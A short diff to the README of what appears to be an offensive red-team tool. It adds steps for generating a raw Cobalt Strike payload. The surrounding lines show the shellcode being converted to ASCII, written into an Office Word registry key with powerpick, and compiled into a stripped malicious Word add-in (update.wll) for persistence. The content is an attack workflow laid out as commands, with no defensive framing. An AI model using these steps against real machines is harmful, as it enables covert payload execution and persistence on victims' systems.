@@ -43,6 +43,15 @@ if __name__ == '__main__':
 ```
 
 ## Commands for updating registry with Cobalt Strike payload
+Generatpayload.bin by cobalt
+```
+1-tap attacks >> packages >>payload generator >> select listener  +select  output >> Raw
+save payload.bin
+```
+
+<img src="/img/p/2.PNG" alt="Getting-gz" width="600" height="150"> 
+
+
 ```
 python shellcode2ascii.py payload.bin
 ```
@@ -63,7 +72,6 @@ powerpick New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Office\14.0\Word" -Na
 i686-w64-mingw32-g++ -Wno-narrowing -shared wlltemplate.cpp -o update.wll
 strip update.wll
 ```
-<img src="/img/p/2.PNG" alt="Getting-gz" width="600" height="150"> 
 
 
 
